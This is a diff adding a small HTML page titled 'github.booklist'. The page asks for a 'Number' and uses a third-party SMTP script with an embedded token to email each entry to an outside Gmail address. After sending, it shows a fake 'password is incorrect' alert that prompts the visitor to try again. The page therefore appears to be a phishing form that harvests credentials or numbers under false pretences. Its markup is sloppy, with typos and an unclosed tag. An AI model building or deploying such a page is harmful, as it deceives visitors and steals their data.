@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-B">
+
+    <meta http-equiv="X-UA-Compatible" contents="IE=edge">
+
+    <meta name="viewport" contents="with=device-width, initial-scale=1.0">
+
+    <title>github.booklist</title>
+
+    </head>
+
+    <style>
+
+     .container{
+
+        display: grid;
+
+        place-items: center;
+
+        
+
+    }
+
+    .main{
+
+      background-color: #72619e;
+
+      width: 370px;
+
+      height: 470px;
+
+    }
+
+     form{
+
+       width: 350px;
+
+       height: 400px;    
+
+     }
+
+    form label{
+
+        color: white;        
+
+    }
+
+    .form-input{
+
+        margin-top: 10px;
+
+        font-size: 20px;
+
+        margin-left: 50px;      
+
+    }
+
+   input{
+
+      width: 80%;
+
+      height: 30px;
+
+      border-radius:10px;
+
+
+    }
+
+    
+
+    .form-input button{
+
+         width: 120px;
+
+         height: 40px;
+
+         font-size: 10px;
+
+         cursor: pointer;
+
+}
+
+    </style>
+
+    <body>
+
+       <div class="container">
+
+       <h1>github.booklist </h1>
+
+
+       <div class="main">
+
+       <form action="">
+
+
+
+           <div class="form-input">
+
+           <label foe="">Number</label><br>
+
+           <input type="text" palaceholder="Enter your Number:" id="number">
+
+       
+
+
+             
+
+            
+      
+
+
+            
+       
+
+
+          
+
+
+           
+       </div>  
+
+        
+
+       <div class="form-input">
+
+        <button type="button" onclick="SendEmail()">Send Email</button>
+
+
+       
+
+       </div>
+
+
+
+
+
+
+
+       </form
+
+       
+
+       </div>
+
+       <!-- end main clasd -->
+
+       </div>
+
+   <!--end Conatiner class   -->
+
+
+          <script src="https://smtpjs.com/v3/smtp.js"> </script>
+
+
+
+
+
+       <script>
+
+         function SendEmail(){
+
+         let name = document.getElementById("number").value;
+
+          
+          
+
+          let body = "number:" + name; 
+
+       
+
+            Email.send({
+
+    SecureToken : "b41e9546-2c5a-4fe7-a7a0-a1773f3dbff3",
+
+   To : 'sepadagerard6@gmail.com',
+
+    From : "goodboyph123@gmail.com",
+
+   Subject : "message from Contact form",
+
+   Body : body
+
+   }).then(function (message) {
+
+   alert("password is incorrect! plsss try again")
+
+   });
+
+   }
+
+
+
+
+         
+
+       </script>
+
+       </body>
+
+       </html>
+
